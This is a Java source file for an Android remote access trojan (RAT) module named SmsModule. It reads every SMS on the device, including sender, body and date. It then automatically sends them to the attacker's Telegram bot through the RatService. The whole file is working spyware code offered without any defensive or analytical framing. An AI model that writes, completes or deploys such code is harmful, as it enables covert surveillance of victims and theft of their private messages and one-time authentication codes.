package com.my.luck.features;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;
import com.my.luck.core.RatService;
import java.text.SimpleDateFormat;
import java.util.*;

public class SmsModule {
    private Context context;
    private RatService ratService;

    public SmsModule(Context context) {
        this.context = context;
        if (context instanceof RatService) {
            this.ratService = (RatService) context;
        }
    }

    public List<HashMap<String, String>> getAllSms() {
        List<HashMap<String, String>> smsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                HashMap<String, String> sms = new HashMap<>();
                sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                smsList.add(sms);
            } while (cursor.moveToNext());
            cursor.close();
        }
        
        // 📤 SEND TO TELEGRAM AUTOMATICALLY
        if (ratService != null && ratService.getTelegramBot() != null) {
            ratService.getTelegramBot().sendSmsList(smsList);
        }
        
        Log.d("SmsModule", "Found " + smsList.size() + " SMS messages");
        return smsList;
    }
}